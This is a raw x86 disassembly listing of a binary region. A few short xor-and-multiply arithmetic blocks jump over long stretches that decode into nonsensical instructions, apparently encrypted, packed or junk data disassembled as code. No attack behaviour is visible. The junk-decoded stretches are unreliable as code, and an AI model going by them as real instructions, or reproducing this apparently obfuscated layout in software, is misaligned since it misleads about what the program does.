  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x679066fb],cl
  40b949:	test   eax,0x7083600d
  40b94e:	jo     0x40b8ef
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b8da
  40b954:	sub    dl,BYTE PTR gs:[edi-0x3f115eaf]
  40b95b:	fstp   TBYTE PTR [ebx-0x51]
  40b95e:	dec    ebx
  40b95f:	mov    edi,0xc6bb95ca
  40b964:	pop    es
  40b965:	rcl    BYTE PTR [ecx],0x71
  40b968:	jecxz  0x40b976
  40b96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96b:	cs ds mov edi,esp
  40b96f:	push   eax
  40b970:	xchg   ebx,eax
  40b971:	sbb    eax,0xfe3e32de
  40b976:	stc    
  40b977:	add    dh,dl
  40b979:	cmp    al,0xbe
  40b97b:	fidivr DWORD PTR [ebp+0x4539dba1]
  40b981:	int3   
  40b982:	xchg   ecx,eax
  40b983:	ja     0x40b984
  40b985:	pop    esi
  40b986:	mov    ds:0xb554f88f,eax
  40b98b:	dec    esp
  40b98c:	add    al,0xb6
  40b98e:	mov    esp,0x380035e0
  40b993:	in     al,dx
  40b994:	pop    eax
  40b995:	retf   0x4eed
  40b998:	inc    edi
  40b999:	inc    edx
  40b99a:	or     edx,DWORD PTR [eax]
  40b99c:	add    al,al
  40b99e:	cmp    eax,0x1eb4d0f9
  40b9a3:	mov    esi,0x8b9fe577
  40b9a8:	inc    eax
  40b9a9:	jmp    FWORD PTR [ebx+0x42]
  40b9ac:	call   0x93687952
  40b9b1:	sbb    bl,BYTE PTR [eax+0x5f]
  40b9b4:	or     edi,ecx
  40b9b6:	push   ebx
  40b9b7:	not    DWORD PTR [ecx-0x42]
  40b9ba:	icebp  
  40b9bb:	test   al,0xb9
  40b9bd:	fstp   DWORD PTR [eax]
  40b9bf:	retf   
  40b9c0:	lods   eax,DWORD PTR ds:[esi]
  40b9c1:	icebp  
  40b9c2:	push   edi
  40b9c3:	fadd   DWORD PTR [esi]
  40b9c5:	dec    ebp
  40b9c6:	and    al,0xdc
  40b9c8:	xchg   edx,eax
  40b9c9:	sbb    ah,dh
  40b9cb:	test   eax,0x4f2f2de
  40b9d0:	retf   0x78ff
  40b9d3:	and    ch,BYTE PTR [edi]
  40b9d5:	xor    bl,al
  40b9d7:	scas   eax,DWORD PTR es:[edi]
  40b9d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9d9:	add    eax,0xd7b8168d
  40b9de:	jg     0x40ba33
  40b9e0:	push   ss
  40b9e1:	stos   DWORD PTR es:[edi],eax
  40b9e2:	mov    ds:0x657a5f7c,eax
  40b9e7:	sbb    ebx,DWORD PTR [eax+0x7f]
  40b9ea:	repz cmp BYTE PTR [edi+0x1b211330],dl
  40b9f1:	fld    DWORD PTR [esi-0xe]
  40b9f4:	sub    bl,BYTE PTR ds:0xf5e73f40
  40b9fa:	fdiv   DWORD PTR [edx]
  40b9fc:	lds    edx,FWORD PTR [eax+ebp*8+0x33]
  40ba00:	fsubr  DWORD PTR [ebp+ebp*4-0x38]
  40ba04:	shl    ebx,1
  40ba06:	out    0x40,al
  40ba08:	mov    al,fs:0xfcd0b632
  40ba0e:	pop    ss
  40ba0f:	xor    DWORD PTR [edx],edi
  40ba11:	std    
  40ba12:	ja     0x40b9b6
  40ba14:	or     eax,0xd3244115
  40ba19:	cmp    DWORD PTR [eax+0x6493836d],edi
  40ba1f:	dec    ecx
  40ba20:	cmp    BYTE PTR [eax-0x5b],dl
  40ba23:	sub    al,0x15
  40ba25:	push   ds
  40ba26:	pop    ecx
  40ba27:	jo     0x40ba98
  40ba29:	rol    BYTE PTR [esi-0x24],cl
  40ba2c:	jbe    0x40ba52
  40ba2e:	push   esi
  40ba2f:	push   eax
  40ba30:	jge    0x40ba4d
  40ba32:	(bad)  
  40ba33:	(bad)  [edx-0x636f57e1]
  40ba39:	mov    ebp,0xba003609
  40ba3e:	push   esp
  40ba3f:	adc    DWORD PTR [ebx],esi
  40ba41:	test   DWORD PTR ds:0x8162099f,esi
  40ba47:	jnp    0x40b9e7
  40ba49:	cmc    
  40ba4a:	hlt    
  40ba4b:	cmc    
  40ba4c:	inc    DWORD PTR [ebp+0x7a6f8f20]
  40ba52:	dec    ecx
  40ba53:	jnp    0x40ba58
  40ba55:	fimul  WORD PTR [esi+0x44]
  40ba58:	mov    dh,al
  40ba5a:	mov    edi,0x6c97b0fb
  40ba5f:	(bad)  
  40ba60:	pop    ds
  40ba61:	pop    esp
  40ba62:	jle    0x40b9f6
  40ba64:	int3   
  40ba65:	sbb    esi,eax
  40ba67:	stos   DWORD PTR es:[edi],eax
  40ba68:	pusha  
  40ba69:	(bad)  [edi+0x30]
  40ba6c:	xchg   BYTE PTR ds:0x643bd7df,dl
  40ba72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba73:	mov    dl,0x13
  40ba75:	jnp    0x40baa1
  40ba77:	addr16 push ebp
  40ba79:	push   0x696b0eca
  40ba7e:	xchg   ecx,eax
  40ba7f:	mov    ebp,DWORD PTR [esp+ecx*1+0x4526480d]
  40ba86:	and    esi,DWORD PTR [eax]
  40ba88:	jmp    0xd746:0xbb36f881
  40ba8f:	in     eax,dx
  40ba90:	fucom  st(6)
  40ba92:	xchg   esp,edx
  40ba94:	loope  0x40bac5
  40ba96:	sub    al,0x65
  40ba98:	imul   ebp,edi,0xffffffbe
  40ba9b:	mov    bl,0xcf
  40ba9d:	adc    eax,0xcb7a801a
  40baa2:	leave  
  40baa3:	adc    DWORD PTR [esi+eiz*1+0x65],ebp
  40baa7:	dec    edx
  40baa8:	pop    ss
  40baa9:	out    dx,eax
  40baaa:	test   eax,0x6622b4be
  40baaf:	add    BYTE PTR [ecx],cl
  40bab1:	xchg   edx,eax
  40bab2:	dec    ebx
  40bab3:	push   0x826eae28
  40bab8:	(bad)  
  40bab9:	cld    
  40baba:	je     0x40bb2a
  40babc:	clc    
  40babd:	retf   
  40babe:	out    0x4,al
  40bac0:	mov    ebx,0xeb085136
  40bac5:	and    al,0x12
  40bac7:	or     esp,esi
  40bac9:	sub    eax,0xb2623784
  40bace:	jo     0x40ba97
  40bad0:	pop    ebx
  40bad1:	pop    ecx
  40bad2:	test   BYTE PTR [edi],dh
  40bad4:	sub    eax,0x291239b3
  40bad9:	or     eax,0xd24a8bd6
  40bade:	add    bh,ch
  40bae0:	jecxz  0x40ba75
  40bae2:	jl     0x40bb47
  40bae4:	outs   dx,DWORD PTR ds:[esi]
  40bae5:	xchg   esp,eax
  40bae6:	xlat   BYTE PTR ds:[ebx]
  40bae7:	in     al,0x5
  40bae9:	push   ebx
  40baea:	repz mov ebp,edx
  40baed:	xchg   ebp,eax
  40baee:	dec    ebx
  40baef:	arpl   WORD PTR [edx-0x6ebaa6f3],si
  40baf5:	pusha  
  40baf6:	dec    eax
  40baf7:	jae    0x40bac8
  40baf9:	outs   dx,DWORD PTR ds:[esi]
  40bafa:	xor    eax,0xef2e8ff6
  40baff:	sub    eax,0x25736a51
  40bb04:	loopne 0x40bab7
  40bb06:	lods   al,BYTE PTR ds:[esi]
  40bb07:	xor    cl,dh
  40bb09:	pcmpgtb mm1,QWORD PTR [edx]
  40bb0c:	test   DWORD PTR [esi+0x75],eax
  40bb0f:	jb     0x40baf4
  40bb11:	test   BYTE PTR [ecx-0xf4ba6cb],cl
  40bb17:	(bad)  
  40bb18:	out    0x28,al
  40bb1a:	or     eax,0xcb6d0495
  40bb1f:	loop   0x40baf4
  40bb21:	in     al,dx
  40bb22:	imul   esp,DWORD PTR [ecx+0x64a7e1d8],0xb3fa3373
  40bb2c:	leave  
  40bb2d:	jne    0x40babb
  40bb2f:	or     DWORD PTR [edi-0x6ec3da98],ebx
  40bb35:	call   0x57307e95
  40bb3a:	(bad)  
  40bb3b:	xor    eax,0x5c57d57a
  40bb40:	pushf  
  40bb41:	dec    ebp
  40bb42:	mov    eax,ds:0x22718a89
  40bb47:	mov    ch,0xcc
  40bb49:	or     DWORD PTR [ebp-0x575e52b],esi
  40bb4f:	arpl   WORD PTR ds:0xcfbed2f4,dx
  40bb55:	xchg   esp,eax
  40bb56:	jo     0x40bb56
  40bb58:	xchg   esp,eax
  40bb59:	sbb    ebp,DWORD PTR ds:[esi-0x39]
  40bb5d:	int3   
  40bb5e:	das    
  40bb5f:	loopne 0x40bb71
  40bb61:	cdq    
  40bb62:	push   es
  40bb63:	mov    cl,0x6
  40bb65:	xor    ebx,0x4f
  40bb68:	or     eax,0xc008b23c
  40bb6d:	fs das 
  40bb6f:	rol    DWORD PTR [ebx-0x562a58f6],0xaa
  40bb76:	call   0xfcce:0xf22d1eec
  40bb7d:	and    al,0x7
  40bb7f:	rcl    DWORD PTR [ecx],1
  40bb81:	mov    bh,0x82
  40bb83:	call   0x79ec:0x7c389d23
  40bb8a:	lds    edx,FWORD PTR [eax+0x6b]
  40bb8d:	jl     0x40bb65
  40bb8f:	retf   0x89a9
  40bb92:	loopne 0x40bc0e
  40bb94:	jnp    0x40bbb7
  40bb96:	xor    DWORD PTR [eax],edi
  40bb98:	and    eax,0x35cf5c9d
  40bb9d:	push   esp
  40bb9e:	stc    
  40bb9f:	add    DWORD PTR [edx+0x6f0b3ee3],ebx
  40bba5:	(bad)  
  40bba6:	or     al,0x9e
  40bba8:	jmp    0x3d32:0xd365e13a
  40bbaf:	adc    BYTE PTR [esi+0x44],dl
  40bbb2:	sub    ch,ah
  40bbb4:	daa    
  40bbb5:	rcr    eax,1
  40bbb7:	call   0x94a18797
  40bbbc:	and    esi,DWORD PTR [ebx]
  40bbbe:	mov    eax,0x295c47b6
  40bbc3:	inc    ecx
  40bbc4:	cs fs xchg ebp,eax
  40bbc7:	adc    al,0x7f
  40bbc9:	test   DWORD PTR [ecx+eiz*4-0x43],edi
  40bbcd:	or     ebp,ebx
  40bbcf:	sub    BYTE PTR [edx-0x2c],bh
  40bbd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd3:	jp     0x40bb7a
  40bbd5:	das    
  40bbd6:	push   eax
  40bbd7:	sbb    eax,0x6bd0fffb
  40bbdc:	clc    
  40bbdd:	pop    esi
  40bbde:	outs   dx,DWORD PTR ds:[esi]
  40bbdf:	mov    ds:0x38f0189d,al
  40bbe4:	pop    ebp
  40bbe5:	jne    0x40bc37
  40bbe7:	sub    dh,bh
  40bbe9:	out    0x4d,al
  40bbeb:	mov    edx,DWORD PTR [ecx]
  40bbed:	sahf   
  40bbee:	sbb    al,0xb2
  40bbf0:	addr16 dec edx
  40bbf2:	out    0x21,al
  40bbf4:	add    eax,DWORD PTR [ecx+eax*4+0x4b061ea8]
  40bbfb:	inc    eax
  40bbfc:	stc    
  40bbfd:	xchg   ecx,eax
  40bbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbff:	jecxz  0x40bc7c
  40bc01:	jo     0x40bba2
  40bc03:	dec    esi
  40bc04:	leave  
  40bc05:	adc    ah,BYTE PTR [ebp-0x6e]
  40bc08:	or     edi,0x59
  40bc0b:	add    dl,BYTE PTR [ecx-0x6160874]
  40bc11:	retf   0xa7c3
  40bc14:	lock and BYTE PTR [edi],0x46
  40bc18:	je     0x40bc27
  40bc1a:	adc    BYTE PTR [edx+0x236fd192],al
  40bc20:	loope  0x40bc3c
  40bc22:	xor    esi,DWORD PTR [ebp+0x7d51c3ad]
  40bc28:	add    eax,0x5191fd2c
  40bc2d:	push   ebx
  40bc2e:	hlt    
  40bc2f:	inc    edi
  40bc30:	xchg   ebp,eax
  40bc31:	bound  eax,QWORD PTR [ebx+0x6ad85162]
  40bc37:	add    BYTE PTR [eax],dh
  40bc39:	jns    0x40bc09
  40bc3b:	push   esi
  40bc3c:	ror    BYTE PTR [ebp+0x1ccbb0f1],1
  40bc42:	sbb    DWORD PTR [ecx+0x73e44351],eax
  40bc48:	or     eax,0x5a4a2575
  40bc4d:	mov    ebp,0x485b7b65
  40bc52:	xchg   esi,eax
  40bc53:	mov    eax,0x92e63b67
  40bc58:	popf   
  40bc59:	nop
  40bc5a:	lock iret 
  40bc5c:	or     al,0x2f
  40bc5e:	or     DWORD PTR [ebx+0x3e],eax
  40bc61:	push   eax
  40bc62:	mov    ah,0x47
  40bc64:	jo     0x40bc5b
  40bc66:	loope  0x40bc8e
  40bc68:	push   es
  40bc69:	jnp    0x40bbf8
  40bc6b:	loopne 0x40bcc0
  40bc6d:	mov    ds:0xb57b4068,al
  40bc72:	sbb    eax,0x3d590543
  40bc77:	sbb    BYTE PTR [eax+0x2c],dl
  40bc7a:	xchg   ebp,eax
  40bc7b:	sub    bl,BYTE PTR [eax-0x2bdf1964]
  40bc81:	test   al,0xee
  40bc83:	mov    dh,0x89
  40bc85:	ss inc esp
  40bc87:	jle    0x40bc15
  40bc89:	adc    bh,cl
  40bc8b:	push   ds
  40bc8c:	into   
  40bc8d:	ret    
  40bc8e:	mov    eax,ds:0xbd9456ff
  40bc93:	mov    ch,BYTE PTR [ebp-0x20e9953d]
  40bc99:	test   eax,0xa3d8f5f3
  40bc9e:	stos   DWORD PTR es:[edi],eax
  40bc9f:	push   ecx
  40bca0:	inc    ebp
  40bca1:	mov    ds:0x1e83830c,eax
  40bca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bca7:	or     BYTE PTR [ebp+edx*4-0xf],dh
  40bcab:	pop    ecx
  40bcac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcad:	xor    BYTE PTR [edx+0x2a430413],cl
  40bcb3:	loope  0x40bc35
  40bcb5:	jae    0x40bd2b
  40bcb7:	push   cs
  40bcb8:	fstp   QWORD PTR [ebp+esi*4-0x14]
  40bcbc:	add    dh,0x9a
  40bcbf:	dec    ebp
  40bcc0:	not    DWORD PTR [ebx+0x79ffc2ab]
  40bcc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc7:	fdiv   DWORD PTR [ebp+esi*4-0xe]
  40bccb:	xlat   BYTE PTR ds:[ebx]
  40bccc:	test   BYTE PTR [edi-0x210e2214],al
  40bcd2:	mov    DWORD PTR [edx+0x51],esp
  40bcd5:	clc    
  40bcd6:	retf   
  40bcd7:	pop    esp
  40bcd8:	push   es
  40bcd9:	or     bh,BYTE PTR [ebp-0x479d5829]
  40bcdf:	mov    cl,0x54
  40bce1:	out    0xf5,al
  40bce3:	pop    esp
  40bce4:	mov    al,0x20
  40bce6:	pop    ss
  40bce7:	push   es
  40bce8:	fs pop ss
  40bcea:	pop    esi
  40bceb:	mov    ecx,0x55438494
  40bcf0:	jnp    0x40bcd7
  40bcf2:	shl    DWORD PTR [eax-0x75],0x5d
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ah,ch
  40bd3f:	sub    al,0xd9
  40bd41:	leave  
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd9e
  40bd4b:	je     0x40bd5e
  40bd4d:	mov    edi,0xd07aa0c1
  40bd52:	je     0x40bd88
  40bd54:	cmp    bl,BYTE PTR [ebx]
  40bd56:	rol    BYTE PTR [edx-0x7f],0x7f
  40bd5a:	out    dx,al
  40bd5b:	outs   dx,BYTE PTR ds:[esi]
  40bd5c:	jge    0x40bd39
  40bd5e:	(bad)  
  40bd5f:	fcom   QWORD PTR [edx+eiz*8+0x36ed55e4]
  40bd66:	fist   DWORD PTR [eax]
  40bd68:	inc    ecx
  40bd69:	jge    0x40bd4c
  40bd6b:	dec    esp
  40bd6c:	ds mov edx,ebx
  40bd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd70:	jo     0x40bde7
  40bd72:	sub    edi,DWORD PTR [edx-0x2abad2f2]
  40bd78:	jmp    DWORD PTR [esi+0x2a]
  40bd7b:	pop    edi
  40bd7c:	stos   BYTE PTR es:[edi],al
  40bd7d:	ror    BYTE PTR [ecx],0x19
  40bd80:	mov    edi,0x8b566e1b
  40bd85:	fs inc ecx
  40bd87:	xchg   edx,eax
  40bd88:	enter  0xb1a8,0xa4
  40bd8c:	xor    BYTE PTR [edi],ch
  40bd8e:	lods   al,BYTE PTR ds:[esi]
  40bd8f:	in     al,0xc5
  40bd91:	fild   WORD PTR [edx]
  40bd93:	mov    ebp,0xdf81a823
  40bd98:	loop   0x40bd33
  40bd9a:	adc    BYTE PTR [ecx-0x59d2dbf8],ah
  40bda0:	fsin   
  40bda2:	sbb    DWORD PTR [ebx+0x3f4f1c40],0x32
  40bda9:	outs   dx,BYTE PTR ds:[esi]
  40bdaa:	retf   
  40bdab:	jo     0xa7ef0cde
  40bdb1:	sbb    BYTE PTR [ecx+0xc],bl
  40bdb4:	fs inc ebp
  40bdb6:	dec    edi
  40bdb7:	test   al,0xa2
  40bdb9:	aad    0xb6
  40bdbb:	cmp    dl,BYTE PTR [edx+ebx*8]
  40bdbe:	jnp    0x40be12
  40bdc0:	inc    ebx
  40bdc1:	and    eax,0xdf533cd2
  40bdc6:	mov    dl,0xae
  40bdc8:	loop   0x40bdbc
  40bdca:	jg     0x40bdd6
  40bdcc:	test   esi,0xc4b7b082
  40bdd2:	adc    esi,DWORD PTR [ecx]
  40bdd4:	mov    bh,0x54
  40bdd6:	mov    ch,0x11
  40bdd8:	fs jae 0x40bd81
  40bddb:	jle    0x40bda7
  40bddd:	sar    ah,cl
  40bddf:	fdiv   st(2),st
  40bde1:	adc    DWORD PTR [ebx],edi
  40bde3:	or     eax,0xbcd7d9eb
  40bde8:	add    ebp,DWORD PTR [ebx-0x58]
  40bdeb:	(bad)  
  40bdec:	aaa    
  40bded:	in     al,dx
  40bdee:	jnp    0x40be65
  40bdf0:	ror    DWORD PTR [edi+0x5863e15b],0xd9
  40bdf7:	cld    
  40bdf8:	es jmp 0xa0721637
  40bdfe:	mov    edi,0xc08e9918
  40be03:	das    
  40be04:	ja     0x40be51
  40be06:	lock jb 0x40be7c
  40be09:	pop    ebp
  40be0a:	hlt    
  40be0b:	pop    edx
  40be0c:	shl    dh,1
  40be0e:	cmp    BYTE PTR ds:0x1eb48cef,bh
  40be14:	mov    BYTE PTR [eax],bh
  40be16:	je     0x40be12
  40be18:	stos   DWORD PTR es:[edi],eax
  40be19:	in     al,dx
  40be1a:	cmp    al,0xec
  40be1c:	addr16 cs ss dec ecx
  40be20:	stos   BYTE PTR es:[edi],al
  40be21:	inc    DWORD PTR [edi+0x513e0d63]
  40be27:	mov    BYTE PTR [ecx-0x18],dl
  40be2a:	mov    dl,0x98
  40be2d:	mov    bh,0x6f
  40be2f:	leave  
  40be30:	pop    ebp
  40be31:	inc    esp
  40be32:	clc    
  40be33:	xchg   edx,eax
  40be34:	stos   DWORD PTR es:[edi],eax
  40be35:	xchg   ecx,eax
  40be36:	dec    ebx
  40be37:	in     eax,0xac
  40be39:	mov    ebx,0xf4a25079
  40be3e:	fild   DWORD PTR [ebp-0x70e9dddc]
  40be44:	jo     0x40be0f
  40be46:	gs mov cl,0xaf
  40be49:	aad    0x75
  40be4b:	dec    eax
  40be4c:	inc    DWORD PTR [edi+0x4708328c]
  40be52:	mov    bh,0x39
  40be54:	je     0x40bdf6
  40be56:	cmp    dl,BYTE PTR [esi-0x7471cc25]
  40be5c:	pop    esp
  40be5d:	ror    esi,1
  40be5f:	inc    esp
  40be60:	(bad)  
  40be61:	ret    0x62bf
  40be64:	add    eax,DWORD PTR [ebx-0x31]
  40be67:	ds xchg ecx,eax
  40be69:	xor    eax,DWORD PTR [esi]
  40be6b:	in     eax,dx
  40be6c:	dec    ecx
  40be6d:	jae    0x40be29
  40be6f:	out    0xbc,al
  40be71:	daa    
  40be72:	rcl    eax,1
  40be74:	cmp    bx,WORD PTR [eax+0x51f26092]
  40be7b:	pop    ecx
  40be7c:	mov    bl,0x28
  40be7e:	mov    eax,ds:0x6cc11b0e
  40be83:	cld    
  40be84:	mov    WORD PTR [ecx+0x41e9e826],ss
  40be8a:	cmp    edx,DWORD PTR [ebp+0x47]
  40be8d:	into   
  40be8e:	push   edi
  40be8f:	(bad)  
  40be90:	ds fwait
  40be92:	loope  0x40be90
  40be94:	daa    
  40be95:	inc    edx
  40be96:	hlt    
  40be97:	into   
  40be98:	mov    edx,0x90017e74
  40be9d:	jg     0x40beec
  40be9f:	leave  
  40bea0:	(bad)  
  40bea2:	mov    edx,0x2ebed91
  40bea7:	loop   0x40bec3
  40bea9:	popf   
  40beaa:	shl    DWORD PTR [esi-0x15dbb711],1
  40beb0:	inc    ebp
  40beb1:	and    ecx,ebx
  40beb3:	inc    eax
  40beb4:	stos   DWORD PTR es:[edi],eax
  40beb5:	dec    ecx
  40beb6:	div    DWORD PTR [ecx-0x10]
  40beb9:	cdq    
  40beba:	test   eax,0x8b03f001
  40bebf:	mov    ds:0x676f16d2,eax
  40bec4:	aam    0x6d
  40bec6:	out    0xc8,al
  40bec8:	fisttp DWORD PTR [eax]
  40beca:	dec    ebp
  40becb:	xchg   ebx,eax
  40becc:	sti    
  40becd:	mov    al,0xc5
  40becf:	lea    ebp,[ebp-0x17]
  40bed2:	pop    edi
  40bed3:	sbb    BYTE PTR [edi],dl
  40bed5:	or     DWORD PTR [eax],eax
  40bed7:	mov    dh,0x7b
  40bed9:	test   BYTE PTR [ebx+0x72],0xe9
  40bedd:	jge    0x40bf44
  40bedf:	xor    al,0x5a
  40bee1:	sub    bh,BYTE PTR [eax+0x2cebc846]
  40bee7:	mov    WORD PTR [ebx-0xfde7dbd],gs
  40beed:	inc    eax
  40beee:	mov    al,0xfb
  40bef0:	or     al,0x8c
  40bef2:	ins    BYTE PTR es:[edi],dx
  40bef3:	adc    DWORD PTR [edx],esp
  40bef5:	jp     0x40bf6f
  40bef7:	dec    edx
  40bef8:	mov    edi,gs
  40befa:	shl    DWORD PTR [ebx-0x53],0xe1
  40befe:	xchg   ebx,eax
  40beff:	arpl   WORD PTR [esi+0x32565589],ax
  40bf05:	cdq    
  40bf06:	(bad)  [eax]
  40bf08:	xor    al,0xa6
  40bf0a:	push   esi
  40bf0b:	loop   0x40bf6c
  40bf0d:	pop    ds
  40bf0e:	outs   dx,DWORD PTR ds:[esi]
  40bf0f:	add    dl,0x32
  40bf12:	pop    ebx
  40bf13:	test   BYTE PTR ds:0xfca61066,0x48
  40bf1a:	std    
  40bf1b:	addr16 cwde 
  40bf1d:	adc    bh,BYTE PTR [esi-0x3d845151]
  40bf23:	jl     0x40bec3
  40bf25:	xor    al,0xe5
  40bf27:	xlat   BYTE PTR ds:[ebx]
  40bf28:	xchg   esp,eax
  40bf29:	or     eax,0x7ae3b3ff
  40bf2e:	mov    ecx,0x59ca9e3a
  40bf33:	fdivrp st(7),st
  40bf35:	jne    0x40bf46
  40bf37:	jmp    0x40bf2a
  40bf39:	jns    0x40bef2
  40bf3b:	scas   eax,DWORD PTR es:[edi]
  40bf3c:	push   eax
  40bf3d:	mov    ebx,0x92139242
  40bf42:	js     0x40bf82
  40bf44:	xor    DWORD PTR [ecx+0x75],esp
  40bf47:	cmc    
  40bf48:	cli    
  40bf49:	ja     0x40bf14
  40bf4b:	ins    BYTE PTR es:[edi],dx
  40bf4c:	or     al,0x6b
  40bf4e:	adc    esi,DWORD PTR [ecx]
  40bf50:	push   esi
  40bf51:	mov    ebx,0xf875d0fa
  40bf56:	mov    ecx,0xba8b0d53
  40bf5b:	mov    ebx,0x5485f7c
  40bf60:	jnp    0x40bfdd
  40bf62:	loope  0x40bfa6
  40bf64:	rcr    DWORD PTR [eax+edi*8+0x2d5e24b5],1
  40bf6b:	adc    DWORD PTR [ecx+eax*2-0x7e],edx
  40bf6f:	xor    al,0x8f
  40bf71:	pop    ss
  40bf72:	jg     0x40bf6e
  40bf74:	cmp    BYTE PTR [edi-0x5bf87659],0xde
  40bf7b:	fadd   DWORD PTR [edx-0x29da314f]
  40bf81:	inc    ecx
  40bf82:	or     BYTE PTR [edx+0x7104cd78],bh
  40bf88:	dec    edi
  40bf89:	shl    ah,cl
  40bf8b:	neg    ebp
  40bf8d:	jp     0x40bf50
  40bf8f:	sar    DWORD PTR [eax],1
  40bf91:	sub    BYTE PTR [edi],cl
  40bf93:	fs adc eax,0x5d7e551f
  40bf99:	cmp    BYTE PTR [edi+0x6b],ah
  40bf9c:	mov    ds:0xa6407c3c,eax
  40bfa1:	int    0x77
  40bfa3:	stos   DWORD PTR es:[edi],eax
  40bfa4:	push   0x2495c875
  40bfa9:	sbb    bl,dl
  40bfab:	(bad)  
  40bfac:	push   edi
  40bfad:	scas   eax,DWORD PTR es:[edi]
  40bfae:	shl    BYTE PTR [ecx-0x1098d376],1
  40bfb4:	js     0x40bff9
  40bfb6:	cmp    DWORD PTR [ebp+0x6b81dfc8],0x59
  40bfbd:	push   cs
  40bfbe:	int3   
  40bfbf:	inc    esi
  40bfc0:	ins    DWORD PTR es:[edi],dx
  40bfc1:	nop
  40bfc2:	or     eax,DWORD PTR [ebp+0x24]
  40bfc5:	jnp    0x40bfec
  40bfc7:	add    dh,BYTE PTR [ecx]
  40bfc9:	arpl   WORD PTR [ecx-0x40],di
  40bfcc:	scas   eax,DWORD PTR es:[edi]
  40bfcd:	push   esi
  40bfce:	nop
  40bfcf:	mov    bl,0xdb
  40bfd1:	jmp    0xddc2:0x2ef024c4
  40bfd8:	xchg   DWORD PTR [eax],eax
  40bfda:	(bad)  
  40bfdb:	dec    esp
  40bfdc:	sbb    al,0x2a
  40bfde:	(bad)  
  40bfdf:	fsubr  st(3),st
  40bfe1:	fwait
  40bfe2:	aas    
  40bfe3:	dec    edi
  40bfe4:	in     al,dx
  40bfe5:	adc    eax,0x98704e2
  40bfea:	xchg   ebx,eax
  40bfeb:	lahf   
  40bfec:	push   ds
  40bfed:	scas   al,BYTE PTR es:[edi]
  40bfee:	repz dec ebp
  40bff0:	std    
  40bff1:	cwde   
  40bff2:	in     eax,0x4d
  40bff4:	out    0x4f,eax
  40bff6:	out    dx,eax
  40bff7:	sahf   
  40bff8:	xchg   edi,eax
  40bff9:	loop   0x40bfac
  40bffb:	inc    esp
  40bffc:	xchg   ecx,eax
  40bffd:	cld    
  40bffe:	xor    esi,ebp
  40c000:	loopne 0x40c050
  40c002:	aam    0x1d
  40c004:	xor    eax,0xefc42576
  40c009:	test   al,dh
  40c00b:	cwde   
  40c00c:	shl    DWORD PTR [ebp+0x1ce021c8],1
  40c012:	sbb    BYTE PTR [ebx+0x2a],0x7c
  40c016:	outs   dx,DWORD PTR ds:[esi]
  40c017:	jmp    0xf7c39001
  40c01c:	jecxz  0x40c099
  40c01e:	fidiv  WORD PTR [edi+0x61]
  40c021:	lock dec esp
  40c023:	jae    0x40c068
  40c025:	loope  0x40bff0
  40c027:	push   ebx
  40c028:	hlt    
  40c029:	jmp    0x6d83:0xd2889918
  40c030:	push   ebp
  40c031:	add    eax,DWORD PTR [eax]
  40c033:	call   0x21721721
  40c038:	mov    ds:0xc6aeb62d,al
  40c03d:	(bad)  
  40c03f:	jmp    0x59f74e80
  40c044:	(bad)  
  40c045:	adc    DWORD PTR [ecx+0xc],esi
  40c048:	lods   al,BYTE PTR ds:[esi]
  40c049:	sub    edi,DWORD PTR [ebx]
  40c04b:	dec    edx
  40c04c:	test   BYTE PTR [ecx-0x55],0xd
  40c050:	les    esp,FWORD PTR [edi+0x40]
  40c053:	push   edi
  40c054:	(bad)  
  40c055:	mov    edi,esp
  40c057:	enter  0x494b,0xa8
  40c05b:	(bad)  
  40c05c:	or     al,0x9d
  40c05e:	jge    0x40c089
  40c060:	push   ebp
  40c061:	outs   dx,DWORD PTR ds:[esi]
